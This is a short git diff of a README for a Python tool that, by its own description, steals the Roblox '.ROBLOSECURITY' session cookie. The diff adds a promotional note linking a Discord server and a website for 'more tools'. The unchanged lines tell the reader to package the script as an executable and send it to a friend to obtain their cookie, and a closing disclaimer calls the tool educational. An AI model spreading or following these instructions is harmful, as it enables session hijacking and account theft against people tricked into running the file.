@@ -10,5 +10,8 @@ I created a simple Python script that steals the ```.ROBLOSECURITY``` cookie sin
 4. (Optional) Use ```auto_py_to_exe``` to convert the python file to an exe file.
 5. Send the file to your friend to get ther roblox cookie.
 
+> [!NOTE]
+> You can join my [Discord](https://discord.gg/N55YYbDZ7Z) or look at my [Website](https://primemarket.github.io/sites/tools-autoclicker.html) if you want to see more tools and information!
+
 > [!CAUTION]
 > This program is for educational purposes only, and I am not responsible for any misuse or damage caused by its use.
